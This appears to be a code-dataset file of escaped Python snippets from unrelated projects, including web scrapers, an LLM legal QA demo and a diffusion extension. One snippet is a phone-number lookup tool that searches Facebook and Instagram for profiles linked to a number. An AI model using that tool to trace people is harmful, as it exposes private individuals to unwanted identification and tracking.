phone_num, business_hours))\n        return store_id\n    except Exception as e:\n        print(f\"DB \uc800\uc7a5 \uc911 \uc624\ub958 \ubc1c\uc0dd: {e}\")\n    finally:\n        cursor.close()\n        db.close()\n\ndef save_menu_to_db(store_id, menu_name, menu_description, menu_image, menu_price):\n    db = connect_to_db()\n    cursor = db.cursor()\n    try:\n        sql = \"\"\"\n        INSERT INTO menus (store_id, menu_name, menu_description, menu_image, menu_price)\n        VALUES (%s, %s, %s, %s, %s)\n        \"\"\"\n        cursor.execute(sql, (store_id, menu_name, menu_description, menu_image, menu_price))\n        db.commit()\n        print(f\"\uba54\ub274 \uc800\uc7a5 \uc131\uacf5: {menu_name}\")\n    except Exception as e:\n        print(f\"\uba54\ub274 \uc800\uc7a5 \uc911 \uc624\ub958 \ubc1c\uc0dd: {e}\")\n    finally:\n        cursor.close()\n        db.close()\n\n# iframe\uc73c\ub85c \uc67c\ucabd \ud3ec\ucee4\uc2a4 \ub9de\ucd94\uae30\ndef switch_left():\n    driver.switch_to.parent_frame()\n    iframe = driver.find_element(By.XPATH,'//*[@id=\"searchIframe\"]')\n    driver.switch_to.frame(iframe)\n\n# iframe\uc73c\ub85c \uc624\ub978\ucabd \ud3ec\ucee4\uc2a4 \ub9de\ucd94\uae30    \ndef switch_right():\n    driver.switch_to.parent_frame()\n    iframe = driver.find_element(By.XPATH,'//*[@id=\"entryIframe\"]')\n    driver.switch_to.frame(iframe)\n    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//div[@class=\"zD5Nm undefined\"]')))\n\noptions = webdriver.ChromeOptions()\noptions.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')\noptions.add_argument('window-size=1380,900')\ndriver = webdriver.Chrome(options=options)\n\n# \ub300\uae30 \uc2dc\uac04\ndriver.implicitly_wait(time_to_wait=3)\n\n# \ud06c\ub864\ub9c1 \uc2dc\uc791 \ud398\uc774\uc9c0\nURL = 'https://map.naver.com/p/search/%EA%B1%B4%EB%8C%80%20%EB%94%94%EC%A0%80%ED%8A%B8?c=12.00,0,0,0,dh'\ndriver.get(url=URL)\n\n\n# \ubc18\ubcf5 \uc885\ub8cc \uc870\uac74\nloop = True\n\n#### \ud06c\ub864\ub9c1 \uc911\ub2e8 \ub410\uc744 \uacbd\uc6b0 2 : \ud574\ub2f9 \ud398\uc774\uc9c0\uc5d0 \ub3c4\ub2ec\ud560 \ub54c\uae4c\uc9c0 '\ub2e4\uc74c \ud398\uc774\uc9c0' \ubc84\ud2bc \ub204\ub984 ####\n# start_page = 3\n\n# \ud604\uc7ac \ud398\uc774\uc9c0\ncurrent_page_no = 1\n    \nwhile(True):\n    switch_left()\n\n    # \ud398\uc774\uc9c0 \uc22b\uc790 \uccb4\ud06c\n    try:\n        next_page_element = WebDriverWait(driver, 10).until(\n            EC.presence_of_element_located((By.XPATH, '//a[@class=\"eUTV2\" and @aria-disabled=\"false\"]'))\n        )\n    except Exception as e:\n        print(\"\uc694\uc18c\ub97c \ucc3e\ub294 \uc911 \uc624\ub958 \ubc1c\uc0dd:\", e)\n        break  # \ub354 \uc774\uc0c1 \uc9c4\ud589\ud560 \uc218 \uc5c6\uc73c\ubbc0\ub85c \ub8e8\ud504 \uc885\ub8cc\n\n    ############## \ub9e8 \ubc11\uae4c\uc9c0 \uc2a4\ud06c\ub864 ##############\n    scrollable_element = driver.find_element(By.CLASS_NAME, \"Ryr1F\")\n\n    last_height = driver.execute_script(\"return arguments[0].scrollHeight\", scrollable_element)\n\n    while True:\n        # \uc694\uc18c \ub0b4\uc5d0\uc11c \uc544\ub798\ub85c 600px \uc2a4\ud06c\ub864\n        driver.execute_script(\"arguments[0].scrollTop += 600;\", scrollable_element)\n\n        # \ud398\uc774\uc9c0 \ub85c\ub4dc \ub300\uae30\n        sleep(1)\n\n        # \uc0c8 \ub192\uc774 \uacc4\uc0b0\n        new_height = driver.execute_script(\"return arguments[0].scrollHeight\", scrollable_element)\n        # \uc2a4\ud06c\ub864\uc774 \ub354 \uc774\uc0c1 \ub298\uc5b4\ub098\uc9c0 \uc54a\uc73c\uba74 \ub8e8\ud504 \uc885\ub8cc\n        if new_height == last_height:\n            break\n\n        last_height = new_height\n\n\n    ############## \ud604\uc7ac \ud398\uc774\uc9c0 \ubc88\ud638 \uac00\uc838\uc624\uae30 ##############\n\n    try:\n        # \ud398\uc774\uc9c0 \ubc88\ud638 \uc694\uc18c \uac00\uc838\uc624\uae30\n        page_no_element = driver.find_element(By.XPATH, '//a[contains(@class, \"mBN2s qxokY\")]')\n        page_no = int(page_no_element.text)\n        print(f\"\ud604\uc7ac \ud398\uc774\uc9c0: {page_no}\")\n    except Exception as e:\n        print(f\"\ud398\uc774\uc9c0 \ubc88\ud638\ub97c \uac00\uc838\uc624\ub294 \uc911 \uc624\ub958 \ubc1c\uc0dd: {e}\")\n        break\n    \n    ############## \ud06c\ub864\ub9c1 \uc911\ub2e8 \ub410\uc744 \uacbd\uc6b0 : 1. \uc6d0\ud558\ub294 \uac00\uac8c \uc774\ud6c4 \ud06c\ub864\ub9c1 \uc7ac\uac1c  ##############\n    # \uc2dc\uc791 \uae30\uc900 \uc124\uc815 (\uae30\uc874 \ud06c\ub864\ub9c1 \uc644\ub8cc\ub41c \ub9c8\uc9c0\ub9c9 \uac00\uac8c \ub9c1\ud06c)\n    # start_after_store_link = \"https://map.naver.com/p/entry/place/1431176645?placePath=%2Fhome\"  # \uc784\uc758\uc758 \uc2dc\uc791 \uae30\uc900 \ub9c1\ud06c\n    # start_crawling = start_after_store_link is None  # \uae30\ubcf8\uc801\uc73c\ub85c \uc2dc\uc791 \uc0c1\ud0dc\ub294 False\n\n    ############# \ud06c\ub864\ub9c1 \uc911\ub2e8 \ub410\uc744 \uacbd\uc6b0 : 2. \uc6d0\ud558\ub294 \ud398\uc774\uc9c0\ubd80\ud130 \uc7ac\uac1c #############\n    # \ubaa9\ud45c \ud398\uc774\uc9c0\ub85c \uc774\ub3d9\n    # if page_no < start_page:\n    #     try:\n    #         next_page_element = WebDriverWait(driver, 10).until(\n    #             EC.element_to_be_clickable((By.XPATH, '//a[@class=\"eUTV2\" and @aria-disabled=\"false\" and .//span[text()=\"\ub2e4\uc74c\ud398\uc774\uc9c0\"]]'))\n    #         )\n    #         driver.execute_script(\"arguments[0].scrollIntoView(true);\", next_page_element)\n   ",
    "\"\"\"\nBasic usage example of the Turkish Legal QA system.\nThis script demonstrates the core functionality of the system.\n\"\"\"\n\nimport os\nfrom dotenv import load_dotenv\nfrom legal_ai.rag import TurkishLegalRAG, LegalQAChain\nfrom langchain_openai import ChatOpenAI\n\n\ndef main():\n    # Load environment variables\n    load_dotenv()\n\n    # Initialize the RAG system\n    rag_system = TurkishLegalRAG(\"data/processed/processed_law.json\")\n\n    # Initialize LLM\n    llm = ChatOpenAI(\n        model_name=\"gpt-3.5-turbo\",\n        temperature=0\n    )\n\n    # Create QA chain\n    qa_chain = LegalQAChain(rag_system, llm)\n\n    # Example questions\n    questions = [\n        \"Ceza kanununun temel amac\u0131 nedir?\",\n        \"T\u00fcrk Ceza Kanunu hangi durumlarda yabanc\u0131 \u00fclkelerde i\u015flenen su\u00e7lara uygulan\u0131r?\",\n        \"Ceza sorumlulu\u011funun esaslar\u0131 nelerdir?\"\n    ]\n\n    # Process each question\n    for question in questions:\n        print(f\"\\nQ: {question}\")\n        try:\n            answer = qa_chain.run(question)\n            print(f\"\\nA: {answer}\")\n        except Exception as e:\n            print(f\"Error processing question: {str(e)}\")\n        print(\"-\" * 50)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import os\nfrom pathlib import Path\n\nimport numpy as np\n\nimport modules.scripts as scripts\nfrom ldm_patched.ldm.modules.attention import CrossAttention, BasicTransformerBlock\nimport ldm_patched.ldm.modules.attention as attention\nimport gradio as gr\n\nimport modules.scripts as scripts\nfrom modules.processing import process_images, Processed\n\nimport torch\nimport glob\n\nimport ldm_patched.modules.ops\nops = ldm_patched.modules.ops.disable_weight_init\n\ncurrent_extension_directory = scripts.basedir()\n\ndef remove_latent_files(save_loc):\n    if save_loc == 'Disk':\n        files = glob.glob(current_extension_directory+'/latents/k/*.pt')\n        for f in files:\n            os.remove(f)\n        files = glob.glob(current_extension_directory+'/latents/v/*.pt')\n        for f in files:\n            os.remove(f)\n    else:\n        try:\n            del CrossAttention.k_dict\n        except:\n            pass\n        try:\n            del CrossAttention.v_dict\n        except:\n            pass\n        CrossAttention.k_dict = {}\n        CrossAttention.v_dict = {}\n\ndef remove_all_latents():\n    remove_latent_files('Disk')\n    remove_latent_files('RAM')\n\nclass Script(scripts.Script):  \n\n    def title(self):\n\n        return \"RefDrop\"\n\n    def show(self, is_txt2img):\n\n        return scripts.AlwaysVisible\n\n    def ui(self, is_img2img):\n        with gr.Group():\n            with gr.Accordion(\"RefDrop\", open=False):\n                enabled = gr.Checkbox(label=\"Enabled\", value=False)\n                \n                with gr.Row(equal_height=True):\n                    save_or_use = gr.Radio([\"Save\", \"Use\"],value=\"Save\",label=\"Mode\",\n                                        info=\"You must first generate a single image to record its embedding information. Caution: Running \\\"Save\\\" a second time will overwrite existing data.\")\n                    enabled_hr = gr.Checkbox(label=\"Enabled for hires fix\", value=False)\n                    \n                rfg = gr.Slider(minimum=-1.0, maximum=1.0, step=0.01, value=0.,\n                                label=\"RFG Coefficent\",\n                                info=\"RFG is only used applying to a new image. Positive values increase consistency with the saved data while negative do the opposite.\")\n                \n                with gr.Row(equal_height=True):\n                    save_loc = gr.Radio([\"RAM\", \"Disk\"],value=\"RAM\",label=\"Latent Store Location\",info=\"Choose 'Disk' if low on memory.\")\n                    save_percent = gr.Slider(minimum=0, maximum=100, step=1, value=100,\n                                            label=\"Save Percentage\",\n                                            info=\"Reduce run time by limiting the number of embedding files saved. Minimal impact >=50%\")\n                with gr.Row():                         \n                    layer_input = gr.Checkbox(label='input',value=True,info='Select which layer group to use. Use mode must use layers that were selected during Save mode, though fewer may be selected during Use mode.')\n                    delete_button = gr.Button('Delete Saved RefDrop Latents',size='sm', scale=0)\n                layer_middle = gr.Checkbox(label='middle',value=True)\n                layer_output = gr.Checkbox(label='output',value=True)\n                \n                \n        delete_button.click(remove_all_latents)\n        \n        return [enabled, rfg, save_or_use, enabled_hr, save_loc, save_percent, layer_input,layer_middle,layer_output]\n\n    def process_before_every_step(\n            self,\n            p,\n            enabled,\n            rfg,\n            save_or_use,\n            enabled_hr,\n            save_loc,\n            save_percent,\n            layer_input,\n            layer_middle,\n            layer_output,\n            *args,\n            **kwarg\n        ):\n\n        if enabled:\n            CrossAttention.current_step += 1\n            CrossAttention.layer_index = 0\n            \n       \n    def process_before_every_sampling(\n                self,\n                p,\n                enabled,\n                rfg,\n                save_or_use,\n                enabled_hr,\n                save_loc,\n                save_percent,\n                layer_input,\n                layer_middle,\n                layer_output,\n                *args,\n                **kwarg\n            ):\n        \n        if enabled:\n            #Reset the layer name to the start\n            CrossAttention.layer_name = 'input'\n            CrossAttention.layer_index = 0\n            \n            #Disable after initial run if \"Enable for hires\" not selected\n            if p.is_hr_pass:\n                if not enabled_hr:\n                    print('Not using RefDrop for hires fix')\n                    CrossAttention.refdrop = 'Done'\n                else:\n                    CrossAttention.refdrop_hires = True\n        \n\n\n    def before_process_batch(\n            self,\n            p,\n            enabled,\n            rfg,\n            save_or_use,\n            enabled_hr,\n            save_loc,\n   ",
    "# -*- coding: utf-8 -*-\n\nimport os\nimport sys\nimport requests\nimport phonenumbers\nfrom phonenumbers import geocoder, carrier\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom bs4 import BeautifulSoup\nimport json\nimport random\nfrom tqdm import tqdm\nimport time\nfrom datetime import datetime\nfrom colorama import Fore, Style, init\nimport pyfiglet\nfrom termcolor import colored\nimport shutil\nimport re\n\n# Initialize colorama for Windows\ninit(autoreset=True)\n\n# Set output encoding to UTF-8\nif sys.platform.startswith('win'):\n    import codecs\n    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')\n    os.system('chcp 65001')\n\n# Initialize Twitter API client (optional)\ntry:\n    import twitter\n    from config import TWITTER_API_KEYS\n    api = twitter.Api(\n        consumer_key=TWITTER_API_KEYS['consumer_key'],\n        consumer_secret=TWITTER_API_KEYS['consumer_secret'],\n        access_token_key=TWITTER_API_KEYS['access_token'],\n        access_token_secret=TWITTER_API_KEYS['access_token_secret']\n    )\n    TWITTER_ENABLED = True\nexcept (ImportError, ModuleNotFoundError):\n    TWITTER_ENABLED = False\n    print(f\"{Fore.YELLOW}[!] Twitter functionality disabled - config.py not found{Style.RESET_ALL}\")\n\ndef setup_driver():\n    \"\"\"Setup undetected-chromedriver with proper options\"\"\"\n    options = webdriver.ChromeOptions()\n    options.add_argument('--headless=new')\n    options.add_argument('--no-sandbox')\n    options.add_argument('--disable-dev-shm-usage')\n    options.add_argument('--disable-gpu')\n    options.add_argument('--window-size=1920,1080')\n    options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')\n    \n    try:\n        driver = webdriver.Chrome(options=options)\n        return driver\n    except Exception as e:\n        print(f\"{Fore.RED}[-] Error setting up Chrome driver: {str(e)}\")\n        return None\n\ndef find_facebook_profile(driver, phone):\n    \"\"\"Find Facebook profile using direct search\"\"\"\n    if not driver:\n        return None\n        \n    try:\n        # Try direct phone number search\n        search_url = f\"https://www.facebook.com/search/people/?q={phone}\"\n        driver.get(search_url)\n        time.sleep(5)  # Wait longer for Facebook to load\n        \n        # Look for profile links\n        soup = BeautifulSoup(driver.page_source, 'html.parser')\n        \n        # Try to find profile links with specific patterns\n        profile_links = soup.find_all('a', href=re.compile(r'facebook\\.com/profile\\.php\\?id=\\d+'))\n        if not profile_links:\n            profile_links = soup.find_all('a', href=re.compile(r'facebook\\.com/[^/]+$'))\n            \n        if profile_links:\n            profile_url = profile_links[0]['href']\n            # Verify if it's a real profile URL\n            if 'l.php' not in profile_url and 'instagram.com' not in profile_url:\n                return profile_url\n                \n        # If no direct profile found, return search URL\n        return f\"https://www.facebook.com/search/people/?q={phone}\"\n            \n    except Exception as e:\n        print(f\"{Fore.YELLOW}[!] Facebook search error: {str(e)}\")\n    return None\n\ndef find_instagram_profile(driver, phone):\n    \"\"\"Find Instagram profile using direct search\"\"\"\n    if not driver:\n        return None\n        \n    try:\n        # Try direct phone search\n        search_url = f\"https://www.instagram.com/web/search/topsearch/?context=user&query={phone}\"\n        driver.get(search_url)\n        time.sleep(5)  # Wait longer for Instagram to load\n        \n        # Get JSON response\n        try:\n            response_text = driver.find_element(By.TAG_NAME, 'pre').text\n            search_results = json.loads(response_text)\n            \n            if search_results and 'users' in search_results:\n                for user in search_results['users']:\n                    if user.get('user', {}).get('username'):\n                        return f\"https://instagram.com/{user['user']['username']}\"\n        except:\n            # If JSON parsing fails, try HTML parsing\n            soup = BeautifulSoup(driver.page_source, 'html.parser')\n            profile_links = soup.find_all('a', href=re.compile(r'instagram\\.com/[^/]+/?$'))\n            \n            if profile_links:\n                profile_url = profile_links[0]['href']\n                if not profile_url.endswith('/'):\n                    profile_url += '/'\n                return profile_url\n                \n        # If no direct profile found, return search URL\n        return f\"https://www.instagram.com/explore/search/keyword/?q={phone}\"\n            \n    except Exception as e:\n        print(f\"{Fore.YELLOW}[!] Instagram search error: {str(e)}\")\n    return None\n\ndef phone_social_lookup():\n    \"\"\"\n    Function to search for social media accounts linked to a ph",
    "import functools\n\nimport litellm\n\n\n@functools.lru_cache(maxsize=32)\ndef litellm_get_model_info(model_name: str) -> dict | None:\n    \"\"\"Get model information with prefix fallback logic using only litellm.\n    \n    Args:\n        model_name: The model identifier to get information for\n        \n    Returns:\n        Dictionary containing model information\n        \n    Raises:\n        ValueError: If model info cannot be found after prefix fallbacks\n    \"\"\"\n    tried_models = [model_name]\n    \n    while True:\n        try:\n            # Attempt to get model info through litellm\n            info = litellm.get_model_info(model_name)\n            if info:\n                return info\n        except Exception:\n            pass\n        \n        # Try removing one prefix level\n        parts = model_name.split(\"/\")\n        if len(parts) <= 1:\n            break\n            \n        model_name = \"/\".join(parts[1:])\n        tried_models.append(model_name)\n\n    return None    \n\n\ndef litellm_get_model_max_input_tokens(model_name: str) -> int | None:\n    \"\"\"Get maximum input tokens for a model using litellm.\n    \n    Args:\n        model_name: The model identifier\n        \n    Returns:\n        Maximum input tokens or None if not found\n    \"\"\"\n    try:\n        info = litellm_get_model_info(model_name)\n        return info.get(\"max_input_tokens\", 8192)\n    except Exception as e:\n        return 8192  # Default for many modern models\n\n\ndef litellm_get_model_max_output_tokens(model_name: str) -> int | None:\n    \"\"\"Get maximum output tokens for a model using litellm.\n    \n    Args:\n        model_name: The model identifier\n        \n    Returns:\n        Maximum output tokens or None if not found\n    \"\"\"\n    try:\n        info = litellm_get_model_info(model_name)\n        return info.get(\"max_output_tokens\", 4096)\n    except Exception as e:\n        return 4096  # Conservative default",
    "\"\"\"Configuration file parser.\n\nA configuration file consists of sections, lead by a \"[section]\" header,\nand followed by \"name: value\" entries, with continuations and such in\nthe style of RFC 822.\n\nIntrinsic defaults can be specified by passing them into the\nConfigParser constructor as a dictionary.\n\nclass:\n\nConfigParser -- responsible for parsing a list of\n                    configuration files, and managing the parsed database.\n\n    methods:\n\n    __init__(defaults=None, dict_type=_default_dict, allow_no_value=False,\n             delimiters=('=', ':'), comment_prefixes=('#', ';'),\n             inline_comment_prefixes=None, strict=True,\n             empty_lines_in_values=True, default_section='DEFAULT',\n             interpolation=<unset>, converters=<unset>):\n\n        Create the parser. When `defaults` is given, it is initialized into the\n        dictionary or intrinsic defaults. The keys must be strings, the values\n        must be appropriate for %()s string interpolation.\n\n        When `dict_type` is given, it will be used to create the dictionary\n        objects for the list of sections, for the options within a section, and\n        for the default values.\n\n        When `delimiters` is given, it will be used as the set of substrings\n        that divide keys from values.\n\n        When `comment_prefixes` is given, it will be used as the set of\n        substrings that prefix comments in empty lines. Comments can be\n        indented.\n\n        When `inline_comment_prefixes` is given, it will be used as the set of\n        substrings that prefix comments in non-empty lines.\n\n        When `strict` is True, the parser won't allow for any section or option\n        duplicates while reading from a single source (file, string or\n        dictionary). Default is True.\n\n        When `empty_lines_in_values` is False (default: True), each empty line\n        marks the end of an option. Otherwise, internal empty lines of\n        a multiline option are kept as part of the value.\n\n        When `allow_no_value` is True (default: False), options without\n        values are accepted; the value presented for these is None.\n\n        When `default_section` is given, the name of the special section is\n        named accordingly. By default it is called ``\"DEFAULT\"`` but this can\n        be customized to point to any other valid section name. Its current\n        value can be retrieved using the ``parser_instance.default_section``\n        attribute and may be modified at runtime.\n\n        When `interpolation` is given, it should be an Interpolation subclass\n        instance. It will be used as the handler for option value\n        pre-processing when using getters. RawConfigParser objects don't do\n        any sort of interpolation, whereas ConfigParser uses an instance of\n        BasicInterpolation. The library also provides a ``zc.buildout``\n        inspired ExtendedInterpolation implementation.\n\n        When `converters` is given, it should be a dictionary where each key\n        represents the name of a type converter and each value is a callable\n        implementing the conversion from string to the desired datatype. Every\n        converter gets its corresponding get*() method on the parser object and\n        section proxies.\n\n    sections()\n        Return all the configuration section names, sans DEFAULT.\n\n    has_section(section)\n        Return whether the given section exists.\n\n    has_option(section, option)\n        Return whether the given option exists in the given section.\n\n    options(section)\n        Return list of configuration options for the named section.\n\n    read(filenames, encoding=None)\n        Read and parse the iterable of named configuration files, given by\n        name.  A single filename is also allowed.  Non-existing files\n        are ignored.  Return list of successfully read files.\n\n    read_file(f, filename=None)\n        Read and parse one configuration file, given as a file object.\n        The filename defaults to f.name; it is only used in error\n        messages (if f has no `name` attribute, the string `<???>` is used).\n\n    read_string(string)\n        Read configuration from a given string.\n\n    read_dict(dictionary)\n        Read configuration from a dictionary. Keys are section names,\n        values are dictionaries with keys and values that should be present\n        in the section. If the used dictionary type preserves order, sections\n        and their keys will be added in order. Values are automatically\n        converted to strings.\n\n    get(section, option, raw=False, vars=None, fallback=_UNSET)\n        Return a string value for the named option.  All % interpolations are\n        expanded in the return values, based on the defaults passed into the\n        constructor and the DEFAULT section.  Additional substitutions may be\n        provided using the `vars` argument, which must be a dictionary whose\n        contents override any pre-existing defaults. If `option` is a key in\n        `vars`, the value",
    "INPUT_ERROR_MESSAGE: str = (\n    \"No input data provided to ChainWrapper.run_chain().\\n\"\n    \"Input data is required to run the chain.\\n\"\n)\n\nMAIN_CHAIN_JSON_ERROR_MESSAGE: str = (\n    \"A json decode error occurred in the main chain. Consider:\\n\"\n    \"1. Check your JSON format instructions\\n\"\n    \"2. Use StrOutputParser() for intermediate chains\\n\"\n    \"3. Simplify your Pydantic model\\n\"\n    \"4. Try a more capable model\\n\"\n)\n\nMAIN_CHAIN_VALIDATION_ERROR_MESSAGE: str = (\n    \"A validation error occurred in the main chain. Consider:\\n\"\n    \"1. Check your Pydantic model\\n\"\n    \"2. Simplify your Pydantic model\\n\"\n    \"3. Try a more capable model\\n\"\n)\n\nMAIN_CHAIN_VALUE_ERROR_MESSAGE: str = (\n    \"A value error occurred in the main chain. Consider:\\n\"\n    \"1. Check your input data\\n\"\n    \"2. Simplify your Pydantic model\\n\"\n    \"3. Try a more capable model\\n\"\n)\n\nMAIN_CHAIN_TYPE_ERROR_MESSAGE: str = (\n    \"A type error occurred in the main chain. Consider:\\n\"\n    \"1. Check your input data\\n\"\n    \"2. Simplify your Pydantic model\\n\"\n    \"3. Try a more capable model\\n\"\n)\n\nFALLBACK_CHAIN_JSON_ERROR_MESSAGE: str = (\n    \"A json decode error occurred in the fallback chain. Consider:\\n\"\n    \"1. Check your JSON format instructions\\n\"\n    \"2. Use StrOutputParser() for intermediate chains\\n\"\n    \"3. Simplify your Pydantic model\\n\"\n    \"4. Try a more capable model\\n\"\n)\n\nFALLBACK_CHAIN_VALIDATION_ERROR_MESSAGE: str = (\n    \"A validation error occurred in the fallback chain. Consider:\\n\"\n    \"1. Check your Pydantic model\\n\"\n    \"2. Simplify your Pydantic model\\n\"\n    \"3. Try a more capable model\\n\"\n)\n\nFALLBACK_CHAIN_VALUE_ERROR_MESSAGE: str = (\n    \"A value error occurred in the fallback chain. Consider:\\n\"\n    \"1. Check your input data\\n\"\n    \"2. Simplify your Pydantic model\\n\"\n    \"3. Try a more capable model\\n\"\n)\n\nFALLBACK_CHAIN_TYPE_ERROR_MESSAGE: str = (\n    \"A type error occurred in the fallback chain. Consider:\\n\"\n    \"1. Check your input data\\n\"\n    \"2. Simplify your Pydantic model\\n\"\n    \"3. Try a more capable model\\n\"\n)\n",
    "# Copyright 2022 ByteDance and/or its affiliates.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom absl import logging\nimport os\nfrom queue import Queue, Empty\nimport socket\nimport threading\nfrom typing import Dict, List\nimport ipaddress\n\n\nclass NodeAliveChecker:\n\n  def __init__(self, addrs: List, timeout: int = 1, num_thread: int = 10):\n    self._addrs = addrs\n    self._timeout = timeout\n    self._num_thread = num_thread\n\n    self._lock = threading.Lock()\n    self._alive = set()\n    self._dead = set()\n\n    self._q = Queue()\n    for addr in self._addrs:\n      self._q.put(addr)\n    self._start()\n\n  def _ping(self, addr):\n    skt = None\n    try:\n      ip, port = addr.rsplit(':', 1)\n      ip = ip.strip('[]')\n      is_ipv6 = is_ipv6_address(ip)\n      skt = socket.socket(socket.AF_INET6 if is_ipv6 else socket.AF_INET,\n                          socket.SOCK_STREAM)\n      skt.settimeout(self._timeout)\n\n      skt.connect((ip, int(port)))\n      with self._lock:\n        self._alive.add(addr)\n    except Exception as err:\n      print(\"cannot connect to {}, because {}\".format(addr, err))\n      with self._lock:\n        self._dead.add(addr)\n    finally:\n      if skt:\n        skt.close()\n\n  def _check_open(self):\n    try:\n      while True:\n        addr = self._q.get_nowait()\n        self._ping(addr)\n    except Empty as err:\n      pass\n\n  def _start(self):\n    threads = []\n    for i in range(self._num_thread):\n      t = threading.Thread(target=self._check_open)\n      t.start()\n      threads.append(t)\n\n    for t in threads:\n      t.join()\n\n  def all_nodes_alive(self):\n    with self._lock:\n      return len(self._dead) == 0\n\n  def get_dead_nodes(self):\n    with self._lock:\n      return list(self._dead)\n\n  def get_alive_nodes(self):\n    with self._lock:\n      return list(self._alive)\n\n  def get_addrs(self):\n    with self._lock:\n      return self._addrs\n\n\ndef is_ipv6_address(ip: str):\n  try:\n    ip_obj = ipaddress.ip_address(ip)\n  except ValueError:\n    return False\n  return ip_obj.version == 6\n\n\ndef concat_ip_and_port(ip: str, port: int):\n  if not is_ipv6_address(ip):\n    return f\"{ip}:{port}\"\n  else:\n    return f\"[{ip}]:{port}\"\n\n\ndef get_local_ip():\n  try:\n    return socket.getaddrinfo(socket.gethostname(), None)[0][4][0]\n  except socket.gaierror:\n    return socket.getaddrinfo(socket.gethostname(),\n                              None,\n                              family=socket.AF_INET6)[0][4][0]\n\n\ndef is_ipv4_supported():\n  return not is_ipv6_address(get_local_ip())\n\n\ndef get_local_server_addr(port: int):\n  \"\"\"Given a port. Returns an addr.\n  In the machine that supports IPv4, it is equivalent to gethostbyname(gethostname()).\n  \"\"\"\n  return concat_ip_and_port(get_local_ip(), port)\n\n\nclass AddressFamily(object):\n  IPV4 = 'ipv4'\n  IPV6 = 'ipv6'\n",
    "import pandas as pd\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.chrome.service import Service\nfrom selenium.webdriver.chrome.options import Options\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nimport time\n\n# Set up Selenium WebDriver\noptions = Options()\noptions.add_argument(\"--headless\")  # Run browser in headless mode\noptions.add_argument(\"--disable-gpu\")\noptions.add_argument(\"--no-sandbox\")\n\n# Path to ChromeDriver\nservice = Service(\"C:/chromedriver-win64/chromedriver.exe\")  # Update this with the correct path\ndriver = webdriver.Chrome(service=service, options=options)\n\n# Define the URL\nurl = \"https://gmg.greatermankato.com/allcategories\"\n\n# Initialize an empty list to store business data\nbusiness_data = []\n\n# Set up WebDriver wait\nwait = WebDriverWait(driver, 20)  # Increase timeout duration\n\ndef safe_click(element):\n    \"\"\"Attempt to click an element, ensuring it is interactable.\"\"\"\n    try:\n        element = WebDriverWait(driver, 10).until(\n            EC.element_to_be_clickable(element)\n        )\n        element.click()\n    except Exception as e:\n        print(f\"Error clicking element: {e}\")\n        # Optionally, print the element details for further debugging\n        print(f\"Element details: {element}\")\n\ndef scroll_to_element(element):\n    \"\"\"Ensure the element is in view before interacting with it.\"\"\"\n    driver.execute_script(\"arguments[0].scrollIntoView();\", element)\n\ntry:\n    # Open the webpage\n    driver.get(url)\n\n    # Wait for the 'All Categories' link to be clickable and click it\n    categories_link = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, \".Directory_All_Categories_Link a\")))\n    safe_click(categories_link)\n    time.sleep(3)\n\n    # Wait for the category list to be present\n    categories = wait.until(EC.presence_of_all_elements_located(\n        (By.CSS_SELECTOR, \".directory_container .ListingCategories_AllCategories_CATEGORY a\")))\n\n    # Extract all categories\n    for category in categories:\n        category_name = category.text\n        safe_click(category)  # Navigate into the category\n        time.sleep(3)\n\n        # Find all the tabs under the \"tabbernav\" class\n        tabs = driver.find_elements(By.CSS_SELECTOR, \"#tabbernav2 li a\")\n\n        # Loop through each tab and extract business data\n        for tab in tabs:\n            scroll_to_element(tab)  # Ensure the tab is in view\n            safe_click(tab)  # Click on the tab to load the content\n            time.sleep(3)  # Wait for the tab content to load\n\n            # Collect business data within the current tab\n            businesses = driver.find_elements(By.CSS_SELECTOR,\n                                              \".ListingResults_All_CONTAINER.ListingResults_Level2_CONTAINER\")\n            for business in businesses:\n                try:\n                    # Extract business name\n                    name_element = business.find_element(By.CSS_SELECTOR,\n                                                         \".ListingResults_Level2_HEADER .ListingResults_All_ENTRYTITLELEFTBOX span[itemprop='name']\")\n                    name = name_element.text if name_element else \"N/A\"\n\n                    # Extract address information\n                    address_element = business.find_element(By.CSS_SELECTOR,\n                                                            \".ListingResults_Level2_MAINLEFTBOX [itemprop='street-address']\")\n                    locality_element = business.find_element(By.CSS_SELECTOR,\n                                                             \".ListingResults_Level2_MAINLEFTBOX [itemprop='locality']\")\n                    region_element = business.find_element(By.CSS_SELECTOR,\n                                                           \".ListingResults_Level2_MAINLEFTBOX [itemprop='region']\")\n                    postal_code_element = business.find_element(By.CSS_SELECTOR,\n                                                                \".ListingResults_Level2_MAINLEFTBOX [itemprop='postal-code']\")\n\n                    address = address_element.text if address_element else \"N/A\"\n                    locality = locality_element.text if locality_element else \"N/A\"\n                    region = region_element.text if region_element else \"N/A\"\n                    postal_code = postal_code_element.text if postal_code_element else \"N/A\"\n\n                    full_address = f\"{address}, {locality}, {region}, {postal_code}\"\n\n                    # Extract phone number\n                    phone_element = business.find_element(By.CSS_SELECTOR, \".ListingResults_Level2_PHONE1\")\n                    phone = phone_element.text if phone_element else \"N/A\"\n\n                    # Append to the business data list\n                    business_data.append([category_name, name, full_address, phone])\n\n                except Exception as e:\n                    print(f\"Error extracting data for business: {e",
